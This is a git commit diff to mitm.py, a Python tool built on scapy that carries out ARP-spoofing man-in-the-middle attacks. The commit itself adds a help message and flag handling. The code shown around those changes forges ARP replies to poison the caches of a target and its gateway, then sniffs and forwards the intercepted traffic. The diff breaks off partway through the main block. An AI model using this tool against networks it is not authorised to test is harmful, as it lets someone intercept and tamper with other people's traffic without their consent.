e476bf7e5310ec627220bb30d7df218bf6b0ac80
Tomas <rkruge@gmail.com>
2024-10-02 19:54:59 +0100

    Added Helper Function

--- mitm.py
+++ mitm.py
@@ -1,7 +1,8 @@
 from scapy.all import ARP, Ether, sr1, send, sniff, IP, get_if_hwaddr
 import colorama, time, threading, sys, subprocess
 
-REQUIRED_FLAGS  = [ '-t', '-i' ]
+REQUIRED_FLAGS  = [ '-t' ]
+HELP_FLAG = '-h'
 
 SOURCE    = None
 TARGET    = None
@@ -13,9 +14,29 @@ INTERVAL  = 0.1
 VERBOSE   = False
 VERBOSER  = False
 
+HELP_MESSAGE = f"""
+ATA ({colorama.Fore.RED}Man-In-The-Middle{colorama.Fore.WHITE}):
+A simple tool for packet interception.
+
+[Required]:
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-t{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the target for the attack.
+
+[Optional]:
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-s{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the origin of the attack.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-g{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the gateway of your network.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-i{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the desired network interface.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-l{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the length of the attack.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-d{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the packet drop interval.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-p{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the interval of each packet.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display more information.
+{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display even more information.
+"""
+
 def CheckFlags(required, arguments):
+	if HELP_FLAG in arguments: PrintMessage(code=1)
+
 	for flag in required:
-		if flag not in arguments: PrintMessage("Required flag criteria not met.", -1)
+		if flag not in arguments: PrintMessage(code=1)
 
 def CheckArguments(parameters):
 	for argument in range(0, len(sys.argv)):
@@ -41,20 +62,16 @@ def CheckArguments(parameters):
 				parameters["Verbose"] = True
 	return parameters
 
-def PrintMessage(message, code):
-	colour = None
+def PrintMessage(message="", code=-1):
 	white = colorama.Fore.WHITE
-
 	match code:
 		case 0:
-			colour = colorama.Fore.GREEN
-			print(f"[{colour}*{white}] {message}")
-		case 1:
-			colour = colorama.Fore.BLUE
-			print(f"[{colour}*{white}] {message}")
+			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
 		case -1:
-			colour = colorama.Fore.RED
-			print(f"[{colour}*{white}] {message}")
+			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
+			sys.exit()
+		case 1:
+			print(HELP_MESSAGE)
 			sys.exit()
 
 def GetGateway(interface):
@@ -73,11 +90,9 @@ def GetMAC(destination, timeout, interface):
 	arp_request = ARP(pdst=destination)
 	response = sr1(arp_request, iface=interface, timeout=timeout, verbose=False)
 
-	if response:
-		return response.hwsrc
-	PrintMessage("Failure to resolve one or more physical addresses.", -1)
+	if response: return response.hwsrc
 
-stop_event = threading.Event()
+	PrintMessage("Failure to resolve one or more physical addresses.", -1)
 
 def Reset(message, gateway, gateway_mac, target, target_mac):
 	gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
@@ -94,7 +109,7 @@ def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_
 		gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
 		target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
 		
-		if verbose: PrintMessage((target_packet.summary(), gateway_packet.summary()), 1)
+		if verbose: PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)
 
 		send(gateway_packet, count=1, verbose=False)
 		send(target_packet,  count=1, verbose=False)
@@ -105,31 +120,25 @@ def ForwardSent(verbose, target, interface):
 	while not stop_event.is_set():
 		packet = sniff(filter="ip", iface=interface, count=1)[0]
 
-		if not packet.haslayer(IP):
-			# time.sleep(INTERVAL)
-			continue
+		if not packet.haslayer(IP): continue
 
 		if packet[IP].src == target:
 			if verbose: PrintMessage(f"(Sent) {packet.summary()}", 0)
 			send(packet, iface=interface, count=1, verbose=False)
 
-		# time.sleep(INTERVAL)
-
 def ForwardReceived(verbose, target, interface):
 	while not stop_event.is_set():
 		packet = sniff(filter="ip", iface=interface, count=1)[0]
 
-		if not packet.haslayer(IP):
-			#time.sleep(INTERVAL)
-			continue
+		if not packet.haslayer(IP): continue
 
 		if packet[IP].dst == target:
 			if verbose: PrintMessage(f"(Received) {packet.summary()}", 0)
 			send(packet, iface=interface, count=1, verbose=False)
 
-		#time.sleep(INTERVAL)
-
 try:
+	stop_event = threading.Event()
+
 	CheckFlags(REQUIRED_FLAGS, sys.argv)
 
 	functional_parameters = {
@@ -153,9 +162,9 @@ try:
 	target_mac    = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"], functional_parameters["Interface"])
 	gateway_mac   = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"], functional_parameters["Interface"])
 
-	PrintMessage(f"(Attacker) {attacker_mac} (Target) {target_mac} (Gateway) {gateway_mac}", 1)
+	PrintMessage(f"(Attacker) {attacker_mac} (Target) {target_mac} (Gateway) {gateway_mac}", 0)
 
-	spoof_thread     = threading.Thread(target=Spoof, args=
+	spoof_thread = threading.Thread(target=Spoof, args=
 	(
 		functional_parameters["Verboser"],
 		functional_parameters["Interval"],
